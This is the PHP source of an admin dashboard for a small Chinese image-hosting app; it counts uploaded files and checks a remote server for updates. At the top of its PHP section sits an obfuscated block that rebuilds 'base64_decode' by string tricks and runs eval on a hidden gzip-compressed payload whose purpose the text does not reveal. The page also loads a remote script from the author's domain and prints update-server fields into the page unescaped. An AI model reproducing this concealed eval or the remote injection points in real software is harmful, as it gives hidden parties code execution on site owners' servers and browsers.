<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>小猫咪图床</title>
<link rel="icon" href="favicon.ico" type="image/ico">
<meta name="keywords" content="小猫咪图床,cc图床">
<meta name="description" content="LightYear是一个基于Bootstrap v3.3.7的后台管理系统的HTML模板。">
<meta name="author" content="yinqi">
<link href="css/bootstrap.min.css" rel="stylesheet">
<link href="css/materialdesignicons.min.css" rel="stylesheet">
<link href="css/style.min.css" rel="stylesheet">
</head>
  
<body>
<div class="lyear-layout-web">
  <div class="lyear-layout-container">
    <!--左侧导航-->
    <aside class="lyear-layout-sidebar">
      
      <!-- logo -->
      <div id="logo" class="sidebar-header">
        <a href="/"><h3>小猫咪图床</h3></a>
      </div>
      <div class="lyear-layout-sidebar-scroll"> 
        
        <nav class="sidebar-main">
          <ul class="nav nav-drawer">
            <li class="nav-item active"> <a href="/admin"><i class="mdi mdi-home"></i> 后台首页</a> </li>
            <li class="nav-item nav-item-has-subnav">
             

            <li class="nav-item nav-item-has-subnav">
              <a href="javascript:void(0)"><i class="mdi mdi-format-align-justify"></i> 前台设置</a>
              <ul class="nav nav-subnav">
                <li> <a href="file.php">图片列表</a> </li>
                <li> <a href="set.php">网站配置</a> </li>
                <li> <a href="key.php">后台密码</a> </li>
                <li> <a href="update.php">系统更新</a> </li>
              </ul>
            </li>
  </li>
          </ul>
        </nav>
        
        <div class="sidebar-footer">
<p class="copyright">Copyright &copy; 2024. <a target="_blank" href="https://lwcat.cn/">云猫</a> All rights reserved.</p>
        </div>
      </div>
      
    </aside>
    <!--End 左侧导航-->
    
    <!--头部信息-->
    <header class="lyear-layout-header">
      
      <nav class="navbar navbar-default">
        <div class="topbar">
          
          <div class="topbar-left">
            <div class="lyear-aside-toggler">
              <span class="lyear-toggler-bar"></span>
              <span class="lyear-toggler-bar"></span>
              <span class="lyear-toggler-bar"></span>
            </div>
            <span class="navbar-page-title"> 后台首页 </span>
          </div>
          
          <ul class="topbar-right">
            <li class="dropdown dropdown-profile">
              <a href="javascript:void(0)" data-toggle="dropdown">
                <img class="img-avatar img-avatar-48 m-r-10" src="https://q.qlogo.cn/g?b=qq&nk=3522934828&s=100" alt="云猫" />
                <span>云猫 <span class="caret"></span></span>
              </a>
              <ul class="dropdown-menu dropdown-menu-right">
                <li> <a href="set.php"><i class="mdi mdi-account"></i> 网站设置</a> </li>
                <li> <a href="key.php"><i class="mdi mdi-lock-outline"></i> 修改密码</a> </li>
                <li> <a href="javascript:void(0)"><i class="mdi mdi-delete"></i> 清空缓存</a></li>
              </ul>
            </li>
            <!--切换主题配色-->
		    <li class="dropdown dropdown-skin">
			  <span data-toggle="dropdown" class="icon-palette"><i class="mdi mdi-palette"></i></span>
			  <ul class="dropdown-menu dropdown-menu-right" data-stopPropagation="true">
                <li class="drop-title"><p>主题</p></li>
                <li class="drop-skin-li clearfix">
                  <span class="inverse">
                    <input type="radio" name="site_theme" value="default" id="site_theme_1" checked>
                    <label for="site_theme_1"></label>
                  </span>
                  <span>
                    <input type="radio" name="site_theme" value="dark" id="site_theme_2">
                    <label for="site_theme_2"></label>
                  </span>
                  <span>
                    <input type="radio" name="site_theme" value="translucent" id="site_theme_3">
                    <label for="site_theme_3"></label>
                  </span>
                </li>
			    <li class="drop-title"><p>LOGO</p></li>
				<li class="drop-skin-li clearfix">
                  <span class="inverse">
                    <input type="radio" name="logo_bg" value="default" id="logo_bg_1" checked>
                    <label for="logo_bg_1"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_2" id="logo_bg_2">
                    <label for="logo_bg_2"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_3" id="logo_bg_3">
                    <label for="logo_bg_3"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_4" id="logo_bg_4">
                    <label for="logo_bg_4"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_5" id="logo_bg_5">
                    <label for="logo_bg_5"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_6" id="logo_bg_6">
                    <label for="logo_bg_6"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_7" id="logo_bg_7">
                    <label for="logo_bg_7"></label>
                  </span>
                  <span>
                    <input type="radio" name="logo_bg" value="color_8" id="logo_bg_8">
                    <label for="logo_bg_8"></label>
                  </span>
				</li>
				<li class="drop-title"><p>头部</p></li>
				<li class="drop-skin-li clearfix">
                  <span class="inverse">
                    <input type="radio" name="header_bg" value="default" id="header_bg_1" checked>
                    <label for="header_bg_1"></label>                      
                  </span>                                                    
                  <span>                                                     
                    <input type="radio" name="header_bg" value="color_2" id="header_bg_2">
                    <label for="header_bg_2"></label>                      
                  </span>                                                    
                  <span>                                                     
                    <input type="radio" name="header_bg" value="color_3" id="header_bg_3">
                    <label for="header_bg_3"></label>
                  </span>
                  <span>
                    <input type="radio" name="header_bg" value="color_4" id="header_bg_4">
                    <label for="header_bg_4"></label>                      
                  </span>                                                    
                  <span>                                                     
                    <input type="radio" name="header_bg" value="color_5" id="header_bg_5">
                    <label for="header_bg_5"></label>                      
                  </span>                                                    
                  <span>                                                     
                    <input type="radio" name="header_bg" value="color_6" id="header_bg_6">
                    <label for="header_bg_6"></label>                      
                  </span>                                                    
                  <span>                                                     
                    <input type="radio" name="header_bg" value="color_7" id="header_bg_7">
                    <label for="header_bg_7"></label>
                  </span>
                  <span>
                    <input type="radio" name="header_bg" value="color_8" id="header_bg_8">
                    <label for="header_bg_8"></label>
                  </span>
				</li>
				<li class="drop-title"><p>侧边栏</p></li>
				<li class="drop-skin-li clearfix">
                  <span class="inverse">
                    <input type="radio" name="sidebar_bg" value="default" id="sidebar_bg_1" checked>
                    <label for="sidebar_bg_1"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_2" id="sidebar_bg_2">
                    <label for="sidebar_bg_2"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_3" id="sidebar_bg_3">
                    <label for="sidebar_bg_3"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_4" id="sidebar_bg_4">
                    <label for="sidebar_bg_4"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_5" id="sidebar_bg_5">
                    <label for="sidebar_bg_5"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_6" id="sidebar_bg_6">
                    <label for="sidebar_bg_6"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_7" id="sidebar_bg_7">
                    <label for="sidebar_bg_7"></label>
                  </span>
                  <span>
                    <input type="radio" name="sidebar_bg" value="color_8" id="sidebar_bg_8">
                    <label for="sidebar_bg_8"></label>
                  </span>
				</li>
			  </ul>
			</li>
            <!--切换主题配色-->
          </ul>
          
        </div>
      </nav>
      
    </header>
    <!--End 头部信息-->
       <?php 
       if(!defined("xOxBkSv"))define("xOxBkSv","KLtbehv");$GLOBALS[xOxBkSv]=explode("|d|G|s", "rxSXKEQ");if(!defined($GLOBALS[xOxBkSv][00]))define($GLOBALS[xOxBkSv][00], ord(47));if(!defined("lsBBrgJ"))define("lsBBrgJ","fCeRFDv");$GLOBALS[lsBBrgJ]=explode("|8|j|2", "ixRYSKJ|8|j|2qgirUhJ|8|j|2|*|7|>|8|j|2|*|7|>base64_decode");if(!defined($GLOBALS[lsBBrgJ][0x0]))define($GLOBALS[lsBBrgJ][0x0],$GLOBALS[lsBBrgJ][1]);$GLOBALS[ixRYSKJ]=explode($GLOBALS[lsBBrgJ][2],$GLOBALS[lsBBrgJ][0x3]);if(!defined("RwvkNGJ"))define("RwvkNGJ","PQpYBlv");$GLOBALS[RwvkNGJ]=explode("|9|]|(", "    |9|]|(fY5Na4NAFEX3gv9hEGGUwARC3oSS2FVLCE7adVJKGcenDlFn/ChUSv57tTa7tqu7OOfe94jr6FqV7ykSythSmaoy9Rh2aHVe9MwWlm7/cOpM5/8IFxxu1NcfWpookR3y9VuKyqQY+PPCC00a+hpOGxkJ/ETWUTT7Ifl0nSuWHY7p218mKKyrA9jVAyQ48Dhu4aRzfq4um81w5IfnOxD66TtPemR7ycXiDGLqYM7jRQ/QPIJoxOhndPoBVWGIt+tUq21/L0ts+4B6bL7OPBrulj/M215d5ws=");echo($GLOBALS[RwvkNGJ][0x0]);eval(gzinflate($GLOBALS[ixRYSKJ][0x1]($GLOBALS[RwvkNGJ][0x1])));
   
error_reporting(0);
session_start();
include '../common/version.php';

function count_files_in_directory($directory) {
    $count = 0;
    if (is_dir($directory)) {
        $iterator = new DirectoryIterator($directory);
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $count++;
            }
        }
    }
    return $count ?: 0;
}

function count_files_recursive($dir) {
    $count = 0;
    if (is_dir($dir)) {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );

        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $count++;
            }
        }
    }
    return $count;
}

$targetDir = "../images/";
$year = date('Y');
$month = date('m');
$day = date('d');
$num = 1;
$dayq = $day - $num;

$path = $targetDir . $year . '/' . $month . '/' . $day;
$directory = $path;
$file_count = count_files_in_directory($directory);

$path2 = $targetDir . $year . '/' . $month . '/' . $dayq;
$directory2 = $path2;
$file_count2 = count_files_in_directory($directory2);

$directory_recursive = '../images'; // 文件保存的目录
$totalFiles = count_files_recursive($directory_recursive);
   ?>
    <!--页面主要内容-->
    <main class="lyear-layout-content">
		 <div class="container-fluid">
			 
			  <div class="row">
          <div class="col-sm-6 col-lg-3">
            <div class="card bg-primary">
              <div class="card-body clearfix">
                <div class="pull-right">
                  <p class="h6 text-white m-t-0">今日上传</p>
                  <p class="h3 text-white m-b-0"><?php echo $file_count;?></p>
                </div>
                <div class="pull-left"> <span class="img-avatar img-avatar-48 bg-translucent"><i class="mdi mdi-cloud-upload"></i></span> </div>
              </div>
            </div>
          </div>
          
          <div class="col-sm-6 col-lg-3">
            <div class="card bg-danger">
              <div class="card-body clearfix">
                <div class="pull-right">
                  <p class="h6 text-white m-t-0">昨日上传</p>
                  <p class="h3 text-white m-b-0"><?php echo $file_count2;?></p>
                </div>
                <div class="pull-left"> <span class="img-avatar img-avatar-48 bg-translucent"><i class="mdi mdi-cloud-upload"></i></span> </div>
              </div>
            </div>
          </div>
          
          <div class="col-sm-6 col-lg-3">
            <div class="card bg-success">
              <div class="card-body clearfix">
                <div class="pull-right">
                  <p class="h6 text-white m-t-0">图片总量</p>
                  <p class="h3 text-white m-b-0"><?php echo $totalFiles;?></p>
                </div>
                <div class="pull-left"> <span class="img-avatar img-avatar-48 bg-translucent"><i class="mdi mdi-image"></i></span> </div>
              </div>
            </div>
          </div>
          
          <div class="col-sm-6 col-lg-3">
            <div class="card bg-purple">
              <div class="card-body clearfix">
                <div class="pull-right">
                  <p class="h6 text-white m-t-0">网站访问</p>
                  <p class="h3 text-white m-b-0">待更新</p>
                </div>
                <div class="pull-left"> <span class="img-avatar img-avatar-48 bg-translucent"><i class="mdi mdi-comment-outline fa-1-5x"></i></span> </div>
              </div>
            </div>
          </div>
        </div>
			 
			          <div class="col-md-6">
            <div class="card">
              <div class="card-header"><h4>检查更新</h4></div>
              <div class="card-body">
                
                    
                    <center>
                        
<?php
$url = "https://lwcat.cn/img/update.php";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
$status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($status_code == 200) {
    $json = json_decode($response, true);
        if ($json['version'] == $version) {
            echo "当前版本".$version."<br>最新版本：".$json['version']."<br>当前已是最新版本";
        } else{
            echo "当前版本：".$version."<br>最新版本：".$json['version']."<br>有新版本哦，请参考更新内容来考虑是否更新<br>本次更新内容：<br>".$json['new']."<br><a class='btn btn-primary' href='".$json['url']."'>下载最新版本</a>";
    }
} else {
    echo "请求服务器失败，请联系作者";
}
?>
                        
                    </center>
              
                
                <center><a href="https://gitee.com/ximami/ccimg/">项目地址：https://gitee.com/ximami/ccimg</a></center>
              </div>
			
		        </div>
        
     
    </main>
    <!--End 页面主要内容-->
  </div>
</div>

<script type="text/javascript" src="js/jquery.min.js"></script>
<script type="text/javascript" src="js/bootstrap.min.js"></script>
<script type="text/javascript" src="js/perfect-scrollbar.min.js"></script>
<script type="text/javascript" src="js/main.min.js"></script>
<script src="https://lwcat.cn/img/admin.js"></script>

	<!--图表插件-->

</body>
</html>